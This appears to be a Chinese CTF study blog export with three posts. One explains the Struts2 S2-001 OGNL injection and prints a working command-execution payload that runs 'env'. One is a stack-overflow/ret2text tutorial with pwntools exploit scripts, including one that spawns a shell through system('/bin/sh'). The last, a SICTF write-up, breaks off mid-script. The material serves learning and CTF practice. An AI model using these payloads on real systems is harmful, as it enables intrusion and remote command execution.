S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，%{value}并重新填充相应的表单数据。例如，在注册或登录页面中。如果提交失败，则服务器通常默认情况下将返回先前提交的数据。由于服务器用于%{value}对提交的数据执行OGNL表达式解析，因此服务器可以直接发送有效载荷来执行命令。</p><h3 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h3><p>在passwd输入测试payload</p><pre><code>%&#123;1+1&#125;</code></pre><p>可以看到回显2</p><p>根据提示直接读环境变量</p><pre><code class="java">`%&#123;`#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></pre><p><a href="https://www.freebuf.com/column/224041.html">参考链接，戳</a></p><h3 id="部分漏洞源码"><a href="#部分漏洞源码" class="headerlink" title="部分漏洞源码"></a>部分漏洞源码</h3><pre><code class="java">public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator) &#123;    Object result = expression;    while(true) &#123;        int start = expression.indexOf(open + &quot;&#123;&quot;);        int length = expression.length();        int x = start + 2;        int count = 1;        while(start != -1 &amp;&amp; x &lt; length &amp;&amp; count != 0) &#123;            char c = expression.charAt(x++);            if (c == &#39;&#123;&#39;) &#123;                ++count;            &#125; else if (c == &#39;&#125;&#39;) &#123;                --count;            &#125;        &#125;        int end = x - 1;        if (start == -1 || end == -1 || count != 0) &#123;            return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);        &#125;        String var = expression.substring(start + 2, end);        Object o = stack.findValue(var, asType);        if (evaluator != null) &#123;            o = evaluator.evaluate(o);        &#125;        String left = expression.substring(0, start);        String right = expression.substring(end + 1);        if (o != null) &#123;            if (TextUtils.stringSet(left)) &#123;                result = left + o;            &#125; else &#123;                result = o;            &#125;            if (TextUtils.stringSet(right)) &#123;                result = result + right;            &#125;            expression = left + o + right;        &#125; else &#123;            result = left + right;            expression = left + right;        &#125;    &#125;&#125;</code></pre><h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>这里我们在passwd中输入%{1*5}，我们看看怎么输出的5</p><p><code>expression</code>会获取不同的参数值，我们直到其获取到<code>password</code>开始分析漏洞原因。</p><pre><code class="java">    while(true) &#123;        int start = expression.indexOf(open + &quot;&#123;&quot;);        int length = expression.length();        int x = start + 2;        int count = 1;</code></pre><p>然后这次的判断跳过了中间的return，为啥会跳过return呢？因为这里的password内容任然是一个ognl表达式所以会再次进入循环，接着这里取出%{password}中间的值password赋给var。</p><pre><code class="java">   while(true) &#123;        int start = expression.indexOf(open + &quot;&#123;&quot;);        int length = expression.length();        int x = start + 2;        int count = 1;</code></pre><p>然后通过Object o &#x3D; stack.findValue(var, asType)获得到password的值为333*666，然后重新赋值给expression，进行下一次循环。</p><pre><code class="java">    String var = expression.substring(start + 2, end);    Object o = stack.findValue(var, asType);</code></pre><p>在这一次循环的时候，就会解析1*5，并将赋值给了o,经过计算后expression的值就变成了5。</p><p>不是OGNL表达式时就会进入</p><pre><code class="java">int end = x - 1;        if (start == -1 || end == -1 || count != 0) &#123;            return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);        &#125;</code></pre><p>这个时候就会输出结果</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h3 id="ognl表达式"><a href="#ognl表达式" class="headerlink" title="ognl表达式"></a>ognl表达式</h3><p>OGNL 是 Object-Graph Navigation Language 的缩写，它是一种功能强大的表达式语言（Expression  Language，简称为  EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。 OGNL 三要素：(以下部分摘抄互联网某处, 我觉得说得好)</p><ol><li><p>表达式（Expression）</p><p>表达式是整个 OGNL 的核心，所有的 OGNL 操作都是针对表达式的解析后进行的。表达式会规定此次 OGNL  操作到底要干什么。我们可以看到，在上面的测试中，name、department.name 等都是表达式，表示取 name 或者  department 中的 name 的值。OGNL 支持很多类型的表达式，之后我们会看到更多</p></li><li><p>根对象（Root Object）</p><p>根对象可以理解为 OGNL 的操作对象。在表达式规定了 “干什么” 以后，你还需要指定到底“对谁干”。在上面的测试代码中，user  就是根对象。这就意味着，我们需要对 user 这个对象去取 name 这个属性的值（对 user 这个对象去设置其中的 department  中的 name 属性值）</p></li><li><p>上下文环境（Context）</p><p>有了表达式和根对象，我们实际上已经可以使用 OGNL 的基本功能。例如，根据表达式对根对象进行取值或者设值工作。不过实际上，在 OGNL  的内部，所有的操作都会在一个特定的环境中运行，这个环境就是 OGNL  的上下文环境（Context）。说得再明白一些，就是这个上下文环境（Context），将规定 OGNL 的操作 “在哪里干”。<br>OGN L 的上下文环境是一个 Map 结构，称之为 OgnlContext。上面我们提到的根对象（Root<br>Object），事实上也会被加入到上下文环境中去，并且这将作为一个特殊的变量进行处理，具体就表现为针对根对象（Root<br>Object）的存取操作的表达式是不需要增加 #符号进行区分的。</p></li></ol><p>表达式功能操作清单：</p><blockquote><p>\1. 基本对象树的访问<br>对象树的访问就是通过使用点号将对象的引用串联起来进行。<br>例如：xxxx，xxxx.xxxx，xxxx. xxxx. xxxx. xxxx. xxxx2. 对容器变量的访问<br>对容器变量的访问，通过#符号加上表达式进行。<br>例如：#xxxx，#xxxx. xxxx，#xxxx.xxxxx. xxxx. xxxx. xxxx3. 使用操作符号<br>OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用 +, -, *, &#x2F;, ++, –, &#x3D;&#x3D;, !&#x3D;, &#x3D; 等操作符之外，还能使用 mod, in, not in等。4. 容器、数组、对象<br>OGNL支持对数组和ArrayList等容器的顺序访问：例如：group.users[0]<br>同时，OGNL支持对Map的按键值查找：<br>例如：#session[‘mySessionPropKey’]<br>不仅如此，OGNL还支持容器的构造的表达式：<br>例如：{“green”, “red”, “blue”}构造一个List，#{“key1” : “value1”, “key2” : “value2”, “key3” : “value3”}构造一个Map<br>你也可以通过任意类对象的构造函数进行对象新建<br>例如：new Java.net.URL(“xxxxxx&#x2F;“)5. 对静态方法或变量的访问<br>要引用类的静态方法和字段，他们的表达方式是一样的@class@member或者@class@method(args)：6. 方法调用<br>直接通过类似Java的方法调用方式进行，你甚至可以传递参数：<br>例如：user.getName()，group.users.size()，group.containsUser(#requestUser)7. 投影和选择<br>OGNL支持类似数据库中的投影（projection） 和选择（selection）。<br>投影就是选出<strong>中每个元素的相同属性组成新的</strong>，类似于关系数据库的字段操作。投影操作语法为 collection.{XXX}，其中XXX 是这个<strong>中每个元素的公共属性。<br>例如：group.userList.{username}将获得某个group中的所有user的name的列表。<br>选择就是过滤满足selection 条件的</strong>元素，类似于关系数据库的纪录操作。选择操作的语法为：collection.{X YYY}，其中X 是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：<br>? 选择满足条件的所有元素<br>^ 选择满足条件的第一个元素<br>$ 选择满足条件的最后一个元素<br>例如：group.userList.{? #txxx.xxx !&#x3D; null}将获得某个group中user的name不为空的user的列表</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> STUDY </category>
          
          <category> WEB </category>
          
          <category> struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP</title>
      <link href="/2023/09/16/pwn/"/>
      <url>/2023/09/16/pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="Pwntools-set-up"><a href="#Pwntools-set-up" class="headerlink" title="Pwntools set up!"></a>Pwntools set up!</h1><p><del>刚入坑，听师傅们说，学pwn会不幸</del></p><h1 id="环境"><a href="#环境" class="headerlink" title="环境!"></a>环境!</h1><p>先配置环境，用到神器<a href="https://www.baidu.com/">百度</a></p><p>这里用的Ubuntu18.04.6</p><h1 id="一些前置知识"><a href="#一些前置知识" class="headerlink" title="一些前置知识!"></a>一些前置知识!</h1><p>刚刚开始，会慢慢补充，当然还是从ctf中学习</p><p>可以了解先一下C语言函数调用栈，栈的结构等</p><h3 id="C语言函数调用栈"><a href="#C语言函数调用栈" class="headerlink" title="C语言函数调用栈"></a>C语言函数调用栈</h3><ul><li><p><a href="http://www.cnblogs.com/clover-toeic/p/3755401.html">C 语言函数调用栈 (一)</a></p></li><li><p><a href="http://www.cnblogs.com/clover-toeic/p/3756668.html">C 语言函数调用栈 (二)</a></p></li></ul><h4 id="一些搬运的知识点"><a href="#一些搬运的知识点" class="headerlink" title="一些搬运的知识点"></a>一些搬运的知识点</h4><p><strong>主要介绍函数调用</strong></p><p>程序的执行过程可看作连续的函数调用</p><p>当一个函数执行完毕时，程序要回到调用指令的下一条指令(紧接call指令)处继续执行。</p><p>函数调用过程通常使用堆栈实现，每个用户态进程对应一个调用栈结构(call stack)。</p><p>编译器使用堆栈传递函数参数、保存返回地址、临时保存寄存器原有值(即函数调用的上下文)以备恢复以及存储本地局部变量。</p><h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p><strong>顾名思义，存储数据和指令的</strong></p><p>寄存器是处理器加工数据或运行程序的重要载体，用于存放程序执行中用到的数据和指令</p><p>32位处理器包含8个四字节寄存器（32&#x3D;8*4）</p><p><img src="/img/271639137915732.jpg"></p><p><strong>指令寄存器EIP</strong> </p><p>在x86处理器中，EIP(Instruction  Pointer)是指令寄存器，指向处理器下条等待执行的指令地址(代码段内的偏移量)，每次执行完相应汇编指令EIP值就会增加。</p><h5 id="ESP-Stack-Pointer"><a href="#ESP-Stack-Pointer" class="headerlink" title="ESP(Stack  Pointer)"></a>ESP(Stack  Pointer)</h5><p>是堆栈指针寄存器，存放执行函数对应栈帧的栈顶地址(也是系统栈的顶部)，且始终指向栈顶；</p><h5 id="EBP-Base-Pointer"><a href="#EBP-Base-Pointer" class="headerlink" title="EBP(Base  Pointer)"></a>EBP(Base  Pointer)</h5><p>是栈帧基址指针寄存器，存放执行函数对应栈帧的栈底地址，用于C运行库访问栈中的局部变量和参数。</p><p>注意，EIP是个特殊寄存器，不能像访问通用寄存器那样访问它，即找不到可用来寻址EIP并对其进行读写的操作码(OpCode)。</p><p>EIP可被jmp、call和ret等指令隐含地改变(事实上它一直都在改变)。</p><p><strong>栈帧结构</strong></p><ul><li>函数调用经常是嵌套的，在同一时刻，堆栈中会有多个函数的信息。每个未完成运行的函数占用一个独立的连续区域，称作栈帧(Stack Frame)</li><li>栈帧是堆栈的逻辑片段</li><li>栈帧存放着函数参数，局部变量及恢复前一栈帧所需要的数据等。</li><li>栈帧的边界由栈帧基地址指针EBP和堆栈指针ESP界定(指针存放在相应寄存器中)。</li><li>EBP指向当前栈帧底部(高地址)，在当前栈帧内位置固定；ESP指向当前栈帧顶部(低地址)，当程序执行时ESP会随着数据的入栈和出栈而移动。</li><li>因此函数中对大部分数据的访问都基于EBP进行。</li></ul><p>IDA的基础用法</p><p>这里是跟着<a href="https://blog.csdn.net/weixin_45943522/category_10819749.html">pwn小白入门</a>、<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/">CTFwiki</a>学习，还有师傅们的悉心教导（我这么菜，真是难为师傅们了）</p><p>指令指针寄存器EIP</p><h1 id="Study-Now"><a href="#Study-Now" class="headerlink" title="Study Now!"></a>Study Now!</h1><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><h3 id="基本栈介绍"><a href="#基本栈介绍" class="headerlink" title="基本栈介绍"></a>基本栈介绍</h3><p>学过数据结构的应该清楚（</p><p>简单了解一下：</p><ul><li>栈是一种后进先出的数据结构</li><li>操作主要有压栈 (push) 与出栈 (pop)，存储数据和取出数据</li><li>主要操作栈顶，但是也有栈底</li></ul><p><strong>类似往箱子里放东西，后放进的先拿出，但是只能在最上面拿防东西</strong></p><p><strong>要注意的是</strong></p><ul><li>在现代计算机体系结构中，每个进程都有自己的地址空间，用于存储程序的指令、数据和其他相关信息。</li><li><strong>进程地址空间</strong>通常被划分为多个区域，如代码区、数据区、堆区和栈区。</li><li>其中栈区，用于保存函数调用信息和局部变量</li><li>当函数被调用时，函数的参数和局部变量等数据会被推入栈中，形成一个称为栈帧（stack frame）的数据结构。</li><li>栈帧包含了函数的返回地址、参数、局部变量和其他与函数执行相关的数据。</li><li>栈帧通过不断向栈底方向增加（减小地址）来动态增长。<strong>栈顶高地址，栈底低地址</strong>,从而方便函数调用</li><li><strong>总结便是：程序的栈是从进程地址空间的高地址向低地址增长的</strong></li></ul><h3 id="基础栈溢出"><a href="#基础栈溢出" class="headerlink" title="基础栈溢出"></a>基础栈溢出</h3><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/">come form</a></p><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p><ul><li>程序必须向栈上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul><p>这里主要介绍栈溢出</p><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong></p><h4 id="来个测试程序"><a href="#来个测试程序" class="headerlink" title="来个测试程序"></a>来个测试程序</h4><h5 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h5><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;void success() &#123; puts(&quot;You Hava already controlled it.&quot;); &#125;void vulnerable() &#123;  char s[12];  gets(s);  puts(s);  return;&#125;int main(int argc, char **argv) &#123;  vulnerable();  return 0;&#125;</code></pre><p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p><p>gcc编译，<strong>编译前请先关闭ASLR</strong>(下面有)</p><pre><code class="sh">gcc -m32 -fno-stack-protector -no-pie 1.c -o pwntest</code></pre><blockquote><p>jue@ubuntu:~&#x2F;桌面&#x2F;newpwn&#x2F;C$ gcc -m32 -fno-stack-protector -no-pie 1.c -o pwntest<br>1.c: In function ‘vulnerable’:<br>1.c:6:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]<br>   gets(s);<br>   ^~~~<br>   fgets<br>&#x2F;tmp&#x2F;ccBLJIgI.o：在函数‘vulnerable’中：<br>1.c:(.text+0x45): 警告： the &#96;gets’ function is dangerous and should not be used.</p></blockquote><p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，</p><p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary</p><p>此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。</p><p>不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。</p><p>如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p><p>我这里开启了PIE保护，所以指令添加了对应参数</p><p>checksec 检查编译出的文件</p><pre><code>   Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。</p><p>简单来说即使可执行文件开启了 PIE  保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE  时基址不同）。</p><p>我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有</p><ul><li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li><li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li><li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li></ul><p>看了一眼，我的系统默认的是2，而且只读权限</p><p>这里要先给randomize_va_space一个写的权限，发现赋权失败</p><p>百度发现我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p><p>这里要先进root,至于为什么<code>sudo echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>失败，我也不清楚</p><p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。</p><h5 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h5><p>IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到</p><pre><code class="c">int vulnerable()&#123;  char s[16]; // [esp+4h] [ebp-14h] BYREF  gets(s);  return puts(s);&#125;</code></pre><p>看到[ebp-14h]</p><p>说明该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p><p><strong>“retaddr” 是指函数调用过程中保存的返回地址（return address）</strong></p><pre><code>                                           +-----------------+                                           |     retaddr     |                                           +-----------------+                                           |     saved ebp   |                                    ebp---&gt;+-----------------+                                           |                 |                                           |                 |                                           |                 |                                           |                 |                                           |                 |                                           |                 |                              s,ebp-0x14--&gt;+-----------------+</code></pre><p>并且，我们可以通过 IDA 获得 success 的地址 0x08048456</p><pre><code class="c">.text:08048456 success         proc near.text:08048456.text:08048456 var_4           = dword ptr -4.text:08048456.text:08048456 ; __unwind &#123;.text:08048456                 push    ebp.text:08048457                 mov     ebp, esp.text:08048459                 push    ebx.text:0804845A                 sub     esp, 4.text:0804845D                 call    __x86_get_pc_thunk_ax.text:08048462                 add     eax, (offset _GLOBAL_OFFSET_TABLE_ - $).text:08048467                 sub     esp, 0Ch.text:0804846A                 lea     edx, (aYouHavaAlready - 804A000h)[eax] ; &quot;You Hava already controlled it.&quot;.text:08048470                 push    edx             ; s.text:08048471                 mov     ebx, eax.text:08048473                 call    _puts.text:08048478                 add     esp, 10h.text:0804847B                 nop.text:0804847C                 mov     ebx, [ebp+var_4].text:0804847F                 leave.text:08048480                 retn.text:08048480 ; &#125; // starts at 8048456.text:08048480 success         endp</code></pre><p>我们的目的便是覆盖retaddr，让读取字符串结束后函数返回到我们要执行的函数</p><p>那么如果我们读取的字符串为</p><pre><code>0x14*&#39;a&#39;+&#39;bbbb&#39;+success_addr</code></pre><p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p><pre><code>                                           +-----------------+                                           |    0x08048456   |                                           +-----------------+                                           |       bbbb      |                                    ebp---&gt;+-----------------+                                           |                 |                                           |                 |                                           |                 |                                           |                 |                                           |                 |                                           |                 |                              s,ebp-0x14--&gt;+-----------------+</code></pre><p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x08048456 在内存中的形式是</p><pre><code>V\x84\x04\x08</code></pre><p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。</p><p>所以我们需要想办法将 \x84  作为一个字符输入进去。</p><p>那么此时我们就需要使用一波 pwntools 了，这里利用  pwntools 的代码如下：</p><pre><code class="python">from pwn import *## 构造与程序交互的对象P = process(&#39;pwntest&#39;)success_addr = 0x08048456## 构造payloadpayload =b&#39;a&#39; * 0x14 + b&#39;bbbb&#39; + p32(success_addr)## 向程序发送字符串P.sendline(payload)## 将代码交互转换为手工交互P.interactive()</code></pre><p>可以看到成功溢出并且执行了success函数</p><p><strong>You Hava already controlled it.</strong></p><pre><code class="sh">[!] Could not find executable &#39;pwntest&#39; in $PATH, using &#39;./pwntest&#39; instead[+] Starting local process &#39;./pwntest&#39;: pid 3339[*] Switching to interactive modeaaaaaaaaaaaaaaaaaaaabbbbV\x84\x04You Hava already controlled it.[*] Got EOF while reading in interactive$</code></pre><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>上面的示例展示了栈溢出中比较重要的几个步骤。</p><h5 id="1、寻找危险函数"><a href="#1、寻找危险函数" class="headerlink" title="1、寻找危险函数"></a>1、寻找危险函数</h5><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出</li><li>sprintf</li><li>字符串</li><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul><h5 id="2、确定填充长度"><a href="#2、确定填充长度" class="headerlink" title="2、确定填充长度"></a>2、确定填充长度</h5><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p><ul><li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li><li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li><li>直接地址索引，就相当于直接给定了地址。</li></ul><p>一般来说，我们会有如下的覆盖需求</p><ul><li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li><li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li><li><strong>覆盖 bss 段某个变量的内容</strong>。</li><li>根据现实执行情况，覆盖特定的变量或地址的内容。</li></ul><p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p><h3 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h3><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。</p><p>攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)</p><p>其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p><p>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。</p><p>ROP 攻击一般得满足如下条件</p><ul><li>程序存在溢出，并且可以控制返回地址。</li><li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li></ul><p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p><h4 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h4><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)</p><p>其实，这种攻击方法是一种笼统的描述。</p><p>我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p><p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p><h5 id="来个栗子"><a href="#来个栗子" class="headerlink" title="来个栗子"></a>来个栗子</h5><p>文件略</p><p>先<code>checksec</code>查看一下程序的保护机制</p><pre><code class="sh">  Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。</p><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s[100]; // [esp+1Ch] [ebp-64h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(_bss_start, 0, 1, 0);  puts(&quot;There is something amazing here, do you know anything?&quot;);  gets(s);  printf(&quot;Maybe I will tell you next time !&quot;);  return 0;&#125;</code></pre><p>看到使用了get函数，存在栈溢出</p><p>shift+f12发现了&#x2F;bin&#x2F;sh</p><p>查看发现，地址为 08048763</p><p>即返回地址覆盖为 0x08048763</p><p>下面就是我们如何构造 payload 了，首先需要确定的是<strong>我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数</strong>。 </p><p>去main函数双击get(s)的s</p><pre><code class="sh">-00000066                 db ? ; undefined-00000065                 db ? ; undefined-00000064 s               db 100 dup(?)+00000000  s              db 4 dup(?)+00000004  r              db 4 dup(?)+00000008 argc            dd ?+0000000C argv            dd ?                    ; offset+00000010 envp            dd ?                    ; offset+00000014+00000014 ; end of stack variables</code></pre><p>可以看到s 是0x64大小，直接填充0x64+4的垃圾字符就可以溢出到存储返回地址的寄存器里</p><h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><pre><code class="python">from pwn import *p = process(&#39;ret2text&#39;)payload=b&#39;a&#39;*(0x64+4)+p32(0x08048763)p.sendline(payload)p.interactive()</code></pre><h1 id="Practise"><a href="#Practise" class="headerlink" title="Practise!"></a>Practise!</h1><h2 id="Ret2text-1"><a href="#Ret2text-1" class="headerlink" title="Ret2text"></a>Ret2text</h2><p>最基础的ROP</p><blockquote><p>题目 come from moectf2023</p></blockquote><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><img src="/img/image-20230914144505349.png"></p><p>先checksec一下开启的保护，这里程序是</p><blockquote><p>32位小端序程序<br>开启了堆栈不可执行保护（NX），即不会把堆栈上的数据当成指令来执行。<br>没有canary保护，可以利用栈溢出来修改eip。<br>PIE地址随机化没有开启。</p></blockquote><h3 id="ida32"><a href="#ida32" class="headerlink" title="ida32"></a>ida32</h3><p>然后ida查看有没有后门函数</p><p>shift+F12</p><p><img src="/img/image-20230914144825345.png"></p><p>发现&#x2F;bin&#x2F;sh 后门函数</p><p>但是&#x2F;bin&#x2F;sh位于data段，也就是字符，无法利用</p><p>但是有system函数，可以把system溢出到下一个要执行的命令，然后让&#x2F;bin&#x2F;sh成为他的data，从而拿到shell</p><p><strong>这里我们需要system函数的地址以及&#x2F;bin&#x2F;sh地址</strong></p><p>进入拿到&#x2F;bin&#x2F;sh的地址 <code>0804C02C</code></p><p><strong>如何溢出</strong></p><p>查看main函数发现put函数</p><p>查看</p><p><img src="/img/image-20230914150229035.png"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先通过栈溢出填充垃圾数据，覆盖到eip之前，再填入后门函数地址，以及让data字段的&#x2F;bin&#x2F;sh成为他的data,即可获得shell。</p><p><strong>那么如何确定栈溢出所需要的垃圾数据长度</strong>？</p><p>可以通过ida直接看，这里buf可以填充58个任意字符，再填充4个任意字符，接下来的字符就会溢出到eip中</p><p>从而控制下一个要执行的函数</p><p><strong>如何实现?</strong></p><p>通过pwntools工具，以及debug调试，实现对二进制文件的操作</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>佬写的exp</p><pre><code class="python">from pwn import *# context(log_level=&#39;debug&#39;)elf = ELF(&#39;pwn&#39;)p = process(&#39;pwn&#39;)# p = remote(&#39;192.168.31.174&#39;,58458)system_plt = elf.plt[&#39;system&#39;]payload= b&#39;a&#39;*(0x58+4)+p32(system_plt)+p32(0)+p32(0x804C02C)p.sendline(b&#39;1111&#39;)p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> STUDY </category>
          
          <category> PWN </category>
          
          <category> ROP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SICTF-2nd</title>
      <link href="/2023/09/10/SICTF-2nd/"/>
      <url>/2023/09/10/SICTF-2nd/</url>
      
        <content type="html"><![CDATA[<p><strong>经过这个比赛充分发现了自己是个CG</strong></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="签到-Welcome"><a href="#签到-Welcome" class="headerlink" title="签到]Welcome"></a>签到]Welcome</h3><p><img src="/img/image-20230910150441032.png"></p><h3 id="Pixel-art"><a href="#Pixel-art" class="headerlink" title="Pixel_art"></a>Pixel_art</h3><pre><code class="PHP">from PIL import Image# 打开PNG图像文件image = Image.open(&#39;image.png&#39;)# 获取图像的宽度和高度width, height = image.size# 遍历每个像素for y in range(height):    for x in range(width):        # 获取像素的RGB值        r, g, b = image.getpixel((x, y))        # 判断RGB值并输出相应字符        if r == 46:            print(&#39;.&#39;,end=&quot;&quot;)        elif r == 33:            print(&#39;!&#39;,end=&quot;&quot;)        elif r == 63:            print(&#39;?&#39;,end=&quot;&quot;)        if g == 46:                print(&#39;.&#39;,end=&quot;&quot;)        elif g == 33:                print(&#39;!&#39;,end=&quot;&quot;)        elif g == 63:                print(&#39;?&#39;,end=&quot;&quot;)        if b == 46:            print(&#39;.&#39;,end=&quot;&quot;)        elif b == 33:            print(&#39;!&#39;,end=&quot;&quot;)        elif b == 63:            